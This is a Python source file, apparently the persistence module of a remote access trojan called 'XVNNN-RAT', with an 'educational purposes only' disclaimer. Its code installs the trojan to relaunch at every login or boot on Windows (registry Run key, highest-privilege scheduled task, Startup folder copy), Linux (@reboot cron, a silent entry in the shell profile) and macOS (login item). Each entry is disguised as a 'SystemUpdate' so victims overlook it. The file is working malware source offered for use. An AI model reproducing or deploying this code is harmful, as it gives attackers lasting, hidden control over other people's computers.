"""
Persistence module for XVNNN-RAT
Author: Ali Zafar (alizafarbati@gmail.com)
Note: This module is for educational/research purposes only.
"""

import platform
import os
import sys
import subprocess
import logging

logger = logging.getLogger(__name__)

class PersistenceModule:
    """Persistence module - for educational purposes only"""
    
    def __init__(self):
        self.name = "persistence"
    
    def add(self, method):
        """Add persistence using specified method"""
        os_type = platform.system()
        
        if os_type == 'Windows':
            if method == 'registry':
                return self.add_registry()
            elif method == 'scheduled_task':
                return self.add_scheduled_task()
            elif method == 'startup':
                return self.add_startup_folder()
            elif method == 'all':
                return self.add_all_windows()
        
        elif os_type == 'Linux':
            if method == 'cron':
                return self.add_cron()
            elif method == 'shell_profile':
                return self.add_shell_profile()
            elif method == 'all':
                return self.add_all_linux()
        
        elif os_type == 'Darwin':
            if method == 'login_item':
                return self.add_login_item()
        
        return {'type': 'cmd_persist', 'error': f'Unknown method: {method}'}
    
    def add_registry(self):
        """Windows: Add to registry"""
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r'Software\Microsoft\Windows\CurrentVersion\Run',
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'SystemUpdate', 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
            return {'type': 'cmd_persist', 'status': 'success', 'method': 'registry'}
        except Exception as e:
            return {'type': 'cmd_persist', 'error': str(e)}
    
    def add_scheduled_task(self):
        """Windows: Create scheduled task"""
        try:
            exe_path = sys.executable
            cmd = f'schtasks /create /tn SystemUpdate /tr "{exe_path}" /sc onlogon /rl highest /f'
            subprocess.run(cmd, shell=True, capture_output=True)
            return {'type': 'cmd_persist', 'status': 'success', 'method': 'scheduled_task'}
        except Exception as e:
            return {'type': 'cmd_persist', 'error': str(e)}
    
    def add_startup_folder(self):
        """Windows: Add to startup folder"""
        try:
            startup_path = os.path.join(os.environ['APPDATA'],
                                       'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            if os.path.exists(startup_path):
                import shutil
                exe_path = sys.executable
                shutil.copy2(exe_path, os.path.join(startup_path, 'SystemUpdate.exe'))
                return {'type': 'cmd_persist', 'status': 'success', 'method': 'startup_folder'}
            return {'type': 'cmd_persist', 'error': 'Startup folder not found'}
        except Exception as e:
            return {'type': 'cmd_persist', 'error': str(e)}
    
    def add_all_windows(self):
        """Add all Windows persistence methods"""
        results = []
        results.append(('Registry', self.add_registry()))
        results.append(('Scheduled Task', self.add_scheduled_task()))
        results.append(('Startup Folder', self.add_startup_folder()))
        return {'type': 'cmd_persist', 'results': results}
    
    def add_cron(self):
        """Linux: Add to crontab"""
        try:
            exe_path = sys.executable
            cron_entry = f"@reboot {exe_path}"
            
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current_cron = result.stdout if result.returncode == 0 else ""
            
            if cron_entry not in current_cron:
                new_cron = current_cron + cron_entry + "\n"
                with open('/tmp/new_cron', 'w') as f:
                    f.write(new_cron)
                subprocess.run(['crontab', '/tmp/new_cron'])
                os.remove('/tmp/new_cron')
                return {'type': 'cmd_persist', 'status': 'success', 'method': 'cron'}
            return {'type': 'cmd_persist', 'status': 'already_exists', 'method': 'cron'}
        except Exception as e:
            return {'type': 'cmd_persist', 'error': str(e)}
    
    def add_shell_profile(self):
        """Linux: Add to shell profile"""
        try:
            exe_path = sys.executable
            shell = os.environ.get('SHELL', '/bin/bash')
            
            if 'bash' in shell:
                profile = os.path.expanduser('~/.bashrc')
            elif 'zsh' in shell:
                profile = os.path.expanduser('~/.zshrc')
            else:
                profile = os.path.expanduser('~/.profile')
            
            startup_cmd = f'\n# System Update\n{exe_path} &> /dev/null &\n'
            
            with open(profile, 'a') as f:
                f.write(startup_cmd)
            
            return {'type': 'cmd_persist', 'status': 'success', 'method': 'shell_profile'}
        except Exception as e:
            return {'type': 'cmd_persist', 'error': str(e)}
    
    def add_all_linux(self):
        """Add all Linux persistence methods"""
        results = []
        results.append(('Cron', self.add_cron()))
        results.append(('Shell Profile', self.add_shell_profile()))
        return {'type': 'cmd_persist', 'results': results}
    
    def add_login_item(self):
        """macOS: Add to login items"""
        try:
            exe_path = sys.executable
            applescript = f'''
tell application "System Events"
    make login item at end with properties {{path:"{exe_path}", hidden:false}}
end tell
'''
            subprocess.run(['osascript', '-e', applescript], capture_output=True)
            return {'type': 'cmd_persist', 'status': 'success', 'method': 'login_item'}
        except Exception as e:
            return {'type': 'cmd_persist', 'error': str(e)}
    
    def all_methods(self):
        """List all available persistence methods"""
        os_type = platform.system()
        
        if os_type == 'Windows':
            methods = ['registry', 'scheduled_task', 'startup', 'all']
        elif os_type == 'Linux':
            methods = ['cron', 'shell_profile', 'all']
        elif os_type == 'Darwin':
            methods = ['login_item']
        else:
            methods = []
        
        return {'type': 'cmd_persist', 'methods': methods, 'os': os_type}